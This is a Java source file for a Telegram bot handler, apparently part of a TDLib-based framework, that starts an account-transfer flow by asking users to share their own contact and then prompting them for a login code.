package tooko.transfer;

import tooko.main.Fn;
import tooko.main.Lang;
import tooko.td.TdApi.Contact;
import tooko.td.TdApi.Message;
import tooko.td.TdApi.MessageContact;
import tooko.td.TdApi.User;
import tooko.td.client.TdHandler;

public class AccountTransfer extends TdHandler {

    public int PERSIST_ID = Fn.PerststId._7;

    @Override
    public void onLoad() {

        initFunction("transfer");

        initPersist(PERSIST_ID);

    }

    @Override
    public void onFunction(User user, long chatId, Message message, String function, String param, String[] params, String[] originParams) {

        writePersist(user, PERSIST_ID);

        send(Fn.sendText(chatId, Fn.plainText(Lang.get(user).TRANSFER_INPUT_CONCACT)));

    }

    @Override
    public void onPersistMessage(final User user, final long chatId, Message message, int subId) {

        final Lang L = Lang.get(user);

        if (subId == 0) {

            if (!(message.content instanceof MessageContact)) {

                onPersistCancel(user, chatId, message, subId);

                return;

            }

            Contact contact = ((MessageContact) message.content).contact;

            if (contact.userId != user.id) {

                send(Fn.sendText(chatId, Fn.plainText(L.TRANSFER_INPUT_CONCACT)));

                removePersist(user);

                return;

            }

            send(Fn.sendText(chatId, Fn.plainText(L.TRANSFER_INPUT_CODE)));

            new UserAgent(user.id, contact.phoneNumber) {

                @Override
                public void onInputCode() {

                    AccountTransfer.this.writePersist(user.id, PERSIST_ID, 1);
                    AccountTransfer.this.send(Fn.sendText(chatId, Fn.plainText(L.TRANSFER_INPUT_CODE)));

                }

            };

        }

    }

}
